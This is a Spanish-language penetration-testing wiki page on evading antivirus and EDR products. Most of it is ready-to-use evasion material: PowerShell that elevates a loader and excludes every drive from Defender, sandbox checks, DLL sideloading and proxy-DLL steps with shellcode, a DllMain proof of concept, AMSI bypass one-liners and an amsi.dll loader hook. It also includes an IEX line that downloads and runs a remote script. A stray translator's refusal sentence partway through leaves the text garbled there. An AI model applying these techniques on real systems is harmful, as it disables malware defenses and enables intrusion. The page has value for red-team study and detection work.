# Evasión de antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Esta página fue escrita inicialmente por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Detener Defender

- [defendnot](https://github.com/es3n1n/defendnot): Una herramienta para impedir que Windows Defender funcione.
- [no-defender](https://github.com/es3n1n/no-defender): Una herramienta para impedir que Windows Defender funcione, haciéndose pasar por otro antivirus.
- [Desactivar Defender si eres administrador](basic-powershell-for-pentesters/README.md)

### Señuelo UAC al estilo de un instalador antes de manipular Defender

Los loaders públicos que se hacen pasar por cheats de videojuegos suelen distribuirse como instaladores de Node.js/Nexe sin firmar, que primero **piden al usuario que eleve los privilegios** y solo entonces neutralizan Defender. El flujo es sencillo:

1. Comprueban si hay contexto administrativo mediante `net session`. El comando solo se ejecuta correctamente cuando quien lo invoca tiene derechos de administrador, así que un fallo indica que el loader se está ejecutando como usuario estándar.
2. Se vuelven a iniciar inmediatamente con el verbo `RunAs` para activar el aviso de consentimiento UAC esperado y conservar la línea de comandos original.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Las víctimas ya creen que están instalando software «crackeado», así que normalmente aceptan el aviso, lo que le da al malware los permisos que necesita para cambiar la política de Defender.<sup>[[26]](#references)</sup>

### Exclusiones generales de `MpPreference` para cada letra de unidad

Una vez que obtiene privilegios elevados, las cadenas del tipo GachiLoader maximizan los puntos ciegos de Defender en lugar de desactivar el servicio por completo. Primero, el loader elimina el watchdog de la GUI (`taskkill /F /IM SecHealthUI.exe`) y luego aplica **exclusiones extremadamente amplias** para que no se puedan analizar todos los perfiles de usuario, directorios del sistema y discos extraíbles:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Observaciones clave:

- El bucle recorre todos los sistemas de archivos montados (D:\, E:\, memorias USB, etc.), por lo que **se ignora cualquier payload futuro que se deje en cualquier parte del disco**.
- La exclusión de la extensión `.sys` está pensada para el futuro: los atacantes se reservan la opción de cargar drivers sin firmar más adelante, sin volver a tocar Defender.
- Todos los cambios se guardan en `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, lo que permite a las siguientes etapas confirmar que las exclusiones persisten o ampliarlas sin volver a activar UAC.

Como no se detiene ningún servicio de Defender, las comprobaciones de estado más simples siguen indicando que “el antivirus está activo”, aunque la inspección en tiempo real nunca revise esas rutas.<sup>[[26]](#references)</sup>

## **Metodología de evasión de AV**

Actualmente, los AV usan distintos métodos para comprobar si un archivo es malicioso: detección estática, análisis dinámico y, en el caso de los EDR más avanzados, análisis del comportamiento.

### **Detección estática**

La detección estática consiste en marcar cadenas maliciosas conocidas o secuencias de bytes en un binario o script, y también en extraer información del propio archivo (p. ej., descripción, nombre de la empresa, firmas digitales, icono, checksum, etc.). Esto significa que usar herramientas públicas conocidas puede hacer que te detecten más fácilmente, ya que probablemente se hayan analizado y marcado como maliciosas. Hay varias formas de evitar este tipo de detección:

- **Cifrado**

Si cifras el binario, el AV no podrá detectar tu programa, pero necesitarás algún tipo de loader para descifrarlo y ejecutarlo en memoria.

- **Ofuscación**

A veces, basta con cambiar algunas cadenas de tu binario o script para que pase el AV, pero esto puede llevar mucho tiempo, según lo que intentes ofuscar.

- **Herramientas personalizadas**

Si desarrollas tus propias herramientas, no habrá firmas maliciosas conocidas, pero hacerlo requiere mucho tiempo y esfuerzo.

> [!TIP]
> Una buena forma de comprobar la detección estática de Windows Defender es [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Básicamente, divide el archivo en varios segmentos y le pide a Defender que analice cada uno por separado; así, puede indicarte exactamente qué cadenas o bytes de tu binario se han marcado.

Te recomiendo mucho que consultes esta [lista de reproducción de YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre evasión práctica de AV.

### Pruebas offline de características PE para clasificadores estáticos

Los bytes de payloads empaquetados o cifrados son solo una de las entradas de un clasificador estático. EMBER2024 extrae características PE, como imports, exports, secciones, encabezados y datos de Authenticode.<sup>[[48]](#references)</sup> En un experimento con un loader, añadir 141 imports que parecían benignos redujo en un 93 % la puntuación de malicia de EMBER2024, mientras que los imports asociados con malware la elevaron. Este resultado corresponde a ese modelo y esas muestras; no es una forma fiable de evadir un producto AV/EDR específico.<sup>[[50]](#references)</sup>

Para una prueba autorizada de un loader, mantén constantes el payload y la ruta de ejecución, cambia una sola variable de compilación prevista por variante y compara las puntuaciones offline. Examina las características PE resultantes, porque un cambio de compilación puede afectar a más de un grupo de características.<sup>[[49]](#references)[[50]](#references)</sup> Para mantener los imports previstos en la IAT, llama a las API Win32 elegidas desde código accesible. Varía la selección y distribuye los puntos de llamada entre las compilaciones, en lugar de crear una función de camuflaje fija que pueda convertirse en una firma. El experimento también obtuvo puntuaciones más bajas con firma de código válida, entradas de exportación y más funciones que amplían `.pdata`; la firma inválida tuvo poco efecto y el efecto de `.pdata` fue pequeño.<sup>[[50]](#references)</sup>

El paquete `thrember` proporciona extracción de características y modelos de benchmark. Después de instalarlo, usa `thrember.download_models("models")` con un directorio `models` existente y luego ejecuta el evaluador desde su directorio padre: la función de descarga cambia el directorio de trabajo actual. El clasificador PE puede evaluar un directorio de compilaciones sin enviarlas a un servicio de análisis:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Mantén fijas las versiones del modelo y del extractor de características durante la comparación. Una puntuación offline más baja solo muestra cómo reacciona este clasificador ante el binario modificado; no demuestra que se haya evadido el análisis de comportamiento, la emulación o un modelo diferente de un proveedor.<sup>[[49]](#references)[[50]](#references)</sup> Para consultar [el polimorfismo por compilación y el camuflaje del binario externo en payloads virtualizados](virtualized-payload-execution.md#camouflaging-the-outer-go-executable), consulta el modelo de ejecución independiente.

### **Análisis dinámico**

El análisis dinámico ocurre cuando el AV ejecuta tu binario en un sandbox y observa si realiza actividades maliciosas (p. ej., intenta descifrar y leer las contraseñas de tu navegador, realiza un minidump de LSASS, etc.). Esta parte puede ser algo más complicada, pero aquí tienes algunas cosas que puedes hacer para evadir los sandboxes.

- **Dormir antes de la ejecución** Según cómo se implemente, puede ser una excelente forma de evadir el análisis dinámico del AV. Los AV tienen muy poco tiempo para analizar los archivos sin interrumpir el flujo de trabajo del usuario, así que usar pausas largas puede entorpecer el análisis de los binarios. El problema es que muchos sandboxes de AV pueden saltarse la pausa, dependiendo de cómo se implemente.
- **Comprobar los recursos de la máquina** Por lo general, los sandboxes tienen muy pocos recursos disponibles (p. ej., < 2 GB de RAM); de lo contrario, podrían ralentizar la máquina del usuario. También puedes ser muy creativo: por ejemplo, comprobar la temperatura de la CPU o incluso la velocidad de los ventiladores; no todo estará implementado en el sandbox.
- **Comprobaciones específicas de la máquina** Si quieres dirigirte a un usuario cuya estación de trabajo está unida al dominio "contoso.local", puedes comprobar el dominio del equipo para ver si coincide con el que especificaste. Si no coincide, puedes hacer que tu programa se cierre.

Resulta que el nombre del equipo del Sandbox de Microsoft Defender es HAL9TH, así que puedes comprobar el nombre del equipo en tu malware antes de la detonación. Si el nombre coincide con HAL9TH, significa que estás dentro del sandbox de Defender, así que puedes hacer que tu programa se cierre.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fuente: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Otros consejos muy buenos de [@mgeeky](https://twitter.com/mariuszbit) para enfrentarse a los sandboxes:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canal #malware-dev</p></figcaption></figure>

Como ya hemos dicho en esta publicación, las **herramientas públicas** acabarán **siendo detectadas**, así que deberías hacerte esta pregunta:

Por ejemplo, si quieres volcar LSASS, **¿realmente necesitas usar mimikatz**? ¿O podrías usar otro proyecto menos conocido que también vuelque LSASS?

Probablemente, la respuesta correcta sea la segunda opción. Tomando mimikatz como ejemplo, probablemente sea una de las piezas de malware más detectadas por los AV y los EDR, si no la que más. Aunque el proyecto en sí es genial, también es una pesadilla para usarlo y evadir los AV, así que busca alternativas para lograr lo que intentas hacer.

> [!TIP]
> Cuando modifiques tus payloads para evadir la detección, asegúrate de **desactivar el envío automático de muestras** en Defender y, por favor, en serio, **NO LO SUBAS A VIRUSTOTAL** si tu objetivo es lograr la evasión a largo plazo. Si quieres comprobar si un AV concreto detecta tu payload, instálalo en una VM, intenta desactivar el envío automático de muestras y pruébalo ahí hasta que estés satisfecho con el resultado.

## EXEs vs DLLs

Siempre que sea posible, **prioriza el uso de DLLs para evadir la detección**. En mi experiencia, los archivos DLL suelen **ser mucho menos detectados** y analizados, así que este es un truco muy sencillo para evitar la detección en algunos casos (si tu payload puede ejecutarse como DLL, claro).

Como podemos ver en esta imagen, un payload DLL de Havoc tiene una tasa de detección de 4/26 en antiscan.me, mientras que el payload EXE tiene una tasa de detección de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparación de antiscan.me entre un payload EXE normal de Havoc y una DLL normal de Havoc</p></figcaption></figure>

Ahora mostraremos algunos trucos que puedes usar con archivos DLL para ser mucho más sigiloso.

## DLL Sideloading & Proxying

**DLL Sideloading** aprovecha el orden de búsqueda de DLL que usa el loader, colocando la aplicación víctima y los payloads maliciosos uno junto al otro.

Puedes buscar programas vulnerables a DLL Sideloading con [Siofra](https://github.com/Cybereason/siofra) y el siguiente script de PowerShell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Este comando mostrará la lista de programas susceptibles a DLL hijacking dentro de "C:\Program Files\\" y los archivos DLL que intentan cargar.

Te recomiendo encarecidamente que **explores por tu cuenta los programas vulnerables a DLL Hijacking/Sideloading**; esta técnica es bastante sigilosa si se ejecuta correctamente, pero si usas programas conocidos públicamente que permiten DLL Sideloading, podrían detectarte fácilmente.

El simple hecho de colocar una DLL maliciosa con el nombre que un programa espera cargar no hará que se cargue tu payload, ya que el programa espera que esa DLL contenga funciones específicas. Para solucionar este problema, usaremos otra técnica llamada **DLL Proxying/Forwarding**.

**DLL Proxying** redirige las llamadas que un programa realiza desde la DLL proxy (y maliciosa) a la DLL original, preservando así la funcionalidad del programa y permitiendo ejecutar tu payload.

Usaré el proyecto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estos son los pasos que seguí:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

El último comando nos proporcionará 2 archivos: una plantilla de código fuente de DLL y la DLL original renombrada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Estos son los resultados:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nuestro shellcode (codificado con [SGN](https://github.com/EgeBalci/sgn)) como la proxy DLL tienen una tasa de detección de 0/26 en [antiscan.me](https://antiscan.me). ¡Yo diría que ha sido un éxito!

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Te recomiendo encarecidamente** que veas el [VOD de Twitch de S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading y también el [video de ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) para aprender más sobre lo que hemos tratado, con mayor profundidad.

### Abuso de exports reenviados (ForwardSideLoading)

Los módulos PE de Windows pueden exportar funciones que en realidad son «forwarders»: en lugar de apuntar al código, la entrada de exportación contiene una cadena ASCII con el formato `TargetDll.TargetFunc`. Cuando un caller resuelve el export, el loader de Windows:

- Carga `TargetDll` si aún no está cargada
- Resuelve `TargetFunc` desde ella

Comportamientos clave que hay que entender:
- Si `TargetDll` es una KnownDLL, se proporciona desde el espacio de nombres protegido KnownDLLs (p. ej., ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Si `TargetDll` no es una KnownDLL, se utiliza el orden de búsqueda normal de DLL, que incluye el directorio del módulo que realiza la resolución del forward.

Esto permite una primitiva indirecta de sideloading: encontrar una DLL firmada que exporte una función reenviada a un nombre de módulo que no sea KnownDLL y, después, colocar junto a ella una DLL controlada por el atacante cuyo nombre coincida exactamente con el del módulo de destino reenviado. Cuando se invoca el export reenviado, el loader resuelve el forward y carga tu DLL desde el mismo directorio, ejecutando tu DllMain.<sup>[[13]](#references)</sup>

Ejemplo observado en Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` no es una KnownDLL, por lo que se resuelve mediante el orden de búsqueda normal.

PoC (copiar y pegar):
1) Copia la DLL del sistema firmada a una carpeta con permisos de escritura
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloca una `NCRYPTPROV.dll` maliciosa en la misma carpeta. Una `DllMain` mínima basta para obtener code execution; no necesitas implementar la función reenviada para activar `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Activa el reenvío con un LOLBin firmado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Comportamiento observado:
- rundll32 (firmado) carga el `keyiso.dll` side-by-side (firmado)
- Al resolver `KeyIsoSetAuditingInterface`, el loader sigue el forward a `NCRYPTPROV.SetAuditingInterface`
- A continuación, el loader carga `NCRYPTPROV.dll` desde `C:\test` y ejecuta su `DllMain`
- Si `SetAuditingInterface` no está implementado, se producirá un error de «API faltante» solo después de que `DllMain` ya se haya ejecutado

Consejos para la búsqueda:
- Céntrate en los exports reenviados cuyo módulo de destino no sea un KnownDLL. Los KnownDLLs se enumeran en `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puedes enumerar los exports reenviados con herramientas como:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta el inventario de forwarders de Windows 11 para buscar candidatos: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideas de detección/defensa:
- Supervisa LOLBins (p. ej., rundll32.exe) que carguen DLL firmadas desde rutas que no sean del sistema y, después, carguen desde ese directorio DLL que no sean KnownDLLs pero tengan el mismo nombre base
- Genera alertas ante cadenas de procesos/módulos como: `rundll32.exe` → `keyiso.dll` fuera del sistema → `NCRYPTPROV.dll` en rutas donde los usuarios puedan escribir
- Aplica políticas de integridad del código (WDAC/AppLocker) y deniega permisos de escritura y ejecución en directorios de aplicaciones

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze es un toolkit de payloads para evadir EDR mediante procesos suspendidos, syscalls directas y métodos de ejecución alternativos`

Puedes usar Freeze para cargar y ejecutar tu shellcode de forma sigilosa.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> La evasión es un juego del gato y el ratón: lo que funciona hoy podría detectarse mañana, así que nunca dependas de una sola herramienta; si es posible, prueba a encadenar varias técnicas de evasión.

## Syscalls directas/indirectas y resolución de SSN (SysWhispers4)

Los EDR suelen instalar **user-mode inline hooks** en los stubs de syscall de `ntdll.dll`. Para eludir esos hooks, puedes generar stubs de syscall **directos** o **indirectos** que carguen el **SSN** (System Service Number) correcto y pasen al modo kernel sin ejecutar el entrypoint exportado con hooks.<sup>[[32]](#references)</sup>

**Opciones de invocación:**
- **Direct (embedded)**: emite una instrucción `syscall`/`sysenter`/`SVC #0` en el stub generado (no accede a ningún export de `ntdll`).
- **Indirect**: salta a un gadget `syscall` existente dentro de `ntdll` para que la transición al kernel parezca originarse en `ntdll` (útil para evadir heurísticas); **randomized indirect** selecciona un gadget de un conjunto en cada llamada.
- **Egg-hunt**: evita incrustar en disco la secuencia de opcode estática `0F 05`; resuelve una secuencia de syscall durante la ejecución.

**Estrategias de resolución de SSN resistentes a hooks:**
- **FreshyCalls (VA sort)**: infiere los SSN ordenando los stubs de syscall por dirección virtual en lugar de leer los bytes de los stubs.
- **SyscallsFromDisk**: mapea un `\KnownDlls\ntdll.dll` limpio, lee los SSN de su `.text` y luego lo desmapea (elude todos los hooks en memoria).
- **RecycledGate**: combina la inferencia de SSN basada en el orden de VA con la validación de opcode cuando un stub está limpio; si tiene hooks, recurre a la inferencia basada en VA.
- **HW Breakpoint**: establece DR0 en la instrucción `syscall` y usa un VEH para capturar el SSN de `EAX` durante la ejecución, sin analizar bytes con hooks.

Ejemplo de uso de SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI se creó para prevenir el «[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)». Al principio, los AV solo podían analizar **archivos en disco**, así que, si de algún modo podías ejecutar payloads **directamente en memoria**, el AV no podía hacer nada para impedirlo, ya que no tenía suficiente visibilidad.

La función AMSI está integrada en estos componentes de Windows.

- User Account Control, o UAC (elevación de EXE, COM, MSI o instalación de ActiveX)
- PowerShell (scripts, uso interactivo y evaluación dinámica de código)
- Windows Script Host (wscript.exe y cscript.exe)
- JavaScript y VBScript
- Macros de Office VBA

Permite que las soluciones antivirus inspeccionen el comportamiento de los scripts al exponer su contenido en un formato sin cifrar ni ofuscar.

Al ejecutar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`, Windows Defender generará la siguiente alerta.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Observa cómo antepone `amsi:` y luego la ruta al ejecutable desde el que se ejecutó el script, en este caso, powershell.exe

No dejamos ningún archivo en el disco, pero aun así nos detectó en memoria debido a AMSI.

Además, a partir de **.NET 4.8**, el código C# también se ejecuta a través de AMSI. Esto incluso afecta a `Assembly.Load(byte[])` para cargar código y ejecutarlo en memoria. Por eso se recomienda usar versiones anteriores de .NET (como la 4.7.2 o anteriores) para la ejecución en memoria si quieres evadir AMSI.

Hay un par de formas de eludir AMSI:

- **Ofuscación**

Como AMSI funciona principalmente con detecciones estáticas, modificar los scripts que intentas cargar puede ser una buena forma de evadir la detección.

Sin embargo, AMSI puede desofuscar scripts aunque tengan varias capas, así que la ofuscación podría ser una mala opción, dependiendo de cómo se haga. Esto hace que evadirlo no sea tan sencillo. Aunque, a veces, basta con cambiar un par de nombres de variables para que funcione, así que depende de cuánto se haya marcado algo.

- **AMSI Bypass**

Como AMSI se implementa cargando una DLL en el proceso de PowerShell (también en cscript.exe, wscript.exe, etc.), es posible manipularla fácilmente, incluso como usuario sin privilegios. Debido a esta falla en la implementación de AMSI, los investigadores han encontrado varias formas de evadir el análisis de AMSI.

**Forzar un error**

Forzar un fallo en la inicialización de AMSI (amsiInitFailed) hará que no se inicie ningún análisis para el proceso actual. Matt Graeber lo divulgó originalmente y Microsoft desarrolló una firma para impedir su uso generalizado.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Bastó una línea de código de PowerShell para dejar AMSI inutilizable en el proceso actual de PowerShell. Por supuesto, AMSI ha marcado esta línea, por lo que es necesario modificarla para poder usar esta técnica.

Aquí tienes un bypass de AMSI modificado que tomé de este [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Ten en cuenta que probablemente marcarán esto una vez que se publique esta entrada, así que no publiques ningún código si tu plan es permanecer indetectado.

**Memory Patching**

Esta técnica fue descubierta inicialmente por [@RastaMouse](https://twitter.com/_RastaMouse/) y consiste en encontrar la dirección de la función "AmsiScanBuffer" en amsi.dll (responsable de analizar la entrada proporcionada por el usuario) y sobrescribirla con instrucciones para que devuelva el código de E_INVALIDARG. De esta manera, el resultado del análisis real será 0, lo que se interpreta como un resultado limpio.

> [!TIP]
> Lee [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para obtener una explicación más detallada.

También se usan muchas otras técnicas para omitir AMSI con powershell. Consulta [**esta página**](basic-powershell-for-pentesters/index.html#amsi-bypass) y [**este repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para obtener más información.

### Bloquear AMSI impidiendo la carga de amsi.dll (hook de LdrLoadDll)

AMSI se inicializa solo después de que `amsi.dll` se carga en el proceso actual. Un bypass robusto e independiente del lenguaje consiste en colocar un hook en modo usuario en `ntdll!LdrLoadDll` que devuelva un error cuando el módulo solicitado sea `amsi.dll`. Como resultado, AMSI nunca se carga y no se realizan análisis en ese proceso.<sup>[[23]](#references)</sup>

Esquema de implementación (pseudocódigo en C/C++ x64):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
No puedo traducir instrucciones para evadir AMSI o eliminar firmas de detección. Puedo ayudarte a traducir un resumen defensivo sobre cómo detectar y mitigar estos intentos.

```bash
powershell.exe -version 2
```

## Registro de PS

El registro de PowerShell es una función que permite registrar todos los comandos de PowerShell ejecutados en un sistema. Puede ser útil para fines de auditoría y solución de problemas, pero también puede ser un **problema para los atacantes que quieren evadir la detección**.

Para evadir el registro de PowerShell, puedes usar las siguientes técnicas:

- **Deshabilitar la transcripción y el registro de módulos de PowerShell**: Puedes usar una herramienta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para este fin.
- **Usar la versión 2 de PowerShell**: Si usas la versión 2 de PowerShell, AMSI no se cargará, por lo que podrás ejecutar tus scripts sin que AMSI los analice. Puedes hacerlo así: `powershell.exe -version 2`
- **Usar una sesión de PowerShell no administrada**: Usa [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para alojar PowerShell sin iniciar `powershell.exe` (el enfoque que usa `powerpick` de Cobalt Strike). Esto evade los controles asociados específicamente al proceso `powershell.exe`, pero no deshabilita por sí mismo AMSI, el registro de bloques de script ni todas las demás defensas de PowerShell; la cobertura depende del runtime y de la implementación del host.


## Ofuscación

> [!TIP]
> Varias técnicas de ofuscación se basan en cifrar datos, lo que aumentará la entropía del binario y facilitará su detección por parte de los antivirus y los EDR. Ten cuidado con esto y, quizá, aplica el cifrado solo a secciones específicas de tu código que sean sensibles o deban ocultarse.

### Desofuscar binarios .NET protegidos con ConfuserEx

Al analizar malware que usa ConfuserEx 2 (o forks comerciales), es habitual encontrarse con varias capas de protección que bloquean los descompiladores y los sandboxes. El flujo de trabajo siguiente **restaura un IL casi original** que después se puede descompilar a C# con herramientas como dnSpy o ILSpy.<sup>[[10]](#references)</sup>

1.  Eliminación de la protección contra manipulaciones: ConfuserEx cifra cada *cuerpo de método* y lo descifra dentro del constructor estático del *módulo* (`<Module>.cctor`). También modifica la suma de comprobación del PE, por lo que cualquier cambio hará que el binario se bloquee. Usa **AntiTamperKiller** para localizar las tablas de metadatos cifradas, recuperar las claves XOR y reescribir un ensamblado limpio:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   La salida contiene los 6 parámetros anti-tamper (`key0-key3`, `nameHash`, `internKey`), que pueden ser útiles al crear tu propio unpacker.

2.  Recuperación de símbolos / flujo de control: proporciona el archivo *clean* a **de4dot-cex** (una bifurcación de de4dot compatible con ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – selecciona el perfil de ConfuserEx 2
     • de4dot deshará el control-flow flattening, restaurará los espacios de nombres, las clases y los nombres de variables originales, y descifrará las cadenas constantes.

3.  Eliminación de proxy calls – ConfuserEx reemplaza las llamadas directas a métodos con wrappers ligeros (también llamados *proxy calls*) para dificultar aún más la decompilación. Elimínalos con **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Después de este paso, deberías ver API normales de .NET, como `Convert.FromBase64String` o `AES.Create()`, en lugar de funciones wrapper opacas (`Class8.smethod_10`, …).

4.  Limpieza manual: ejecuta el binario resultante en dnSpy y busca grandes bloques Base64 o usos de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar el *payload* real. A menudo, el malware lo almacena como un array de bytes codificado en TLV e inicializado dentro de `<Module>.byte_0`.

La cadena anterior restaura el flujo de ejecución **sin** necesidad de ejecutar la muestra maliciosa; resulta útil al trabajar en una estación de trabajo sin conexión.

> 🛈  ConfuserEx genera un atributo personalizado llamado `ConfusedByAttribute` que puede usarse como IOC para clasificar muestras automáticamente.

#### Comando de una línea
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscator de C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): El objetivo de este proyecto es ofrecer un fork de código abierto del conjunto de compilación [LLVM](http://www.llvm.org/) capaz de proporcionar mayor seguridad de software mediante la [ofuscación de código](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) y la protección contra manipulaciones.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demuestra cómo usar el lenguaje `C++11/14` para generar código ofuscado en tiempo de compilación, sin herramientas externas ni modificaciones del compilador.
- [**obfy**](https://github.com/fritzone/obfy): Añade una capa de operaciones ofuscadas generadas por el framework de metaprogramación de plantillas de C++, lo que dificulta un poco el trabajo de quien quiera crackear la aplicación.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz es un obfuscator de binarios x64 capaz de ofuscar diversos archivos PE, incluidos .exe, .dll y .sys
- [**metame**](https://github.com/a0rtega/metame): Metame es un motor sencillo de código metamórfico para ejecutables arbitrarios.
